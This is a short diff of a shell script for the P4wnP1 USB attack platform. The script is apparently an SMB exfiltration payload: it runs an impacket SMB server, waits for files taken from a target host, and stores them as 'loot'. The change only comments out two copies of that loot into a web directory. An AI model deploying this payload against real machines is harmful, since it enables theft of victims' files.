@@ -48,7 +48,7 @@ HOST=$TARGET_HOSTNAME
 COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
 COUNT=$((COUNT+1))
 mkdir -p $LOOTDIR/$HOST-$COUNT
-mkdir -p /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
+#mkdir -p /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
 
 # Start the SMB Server
 python3 /usr/share/doc/python3-impacket/examples/smbserver.py s /loot/smb_exfiltrator -smb2support | tee /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT/log.txt &
@@ -70,7 +70,7 @@ while ! [ -f /loot/smb_exfiltrator/EXFILTRATION_COMPLETE ]; do sleep 1; done
 rm -rf /loot/smb_exfiltrator/EXFILTRATION_COMPLETE
 
 # Move files to permanent loot directory
-cp -R /loot/smb_exfiltrator/e/* /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
+#cp -R /loot/smb_exfiltrator/e/* /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
 cp -R /loot/smb_exfiltrator/e/* $LOOTDIR/$HOST-$COUNT
 
 # Clean up temporary loot directory
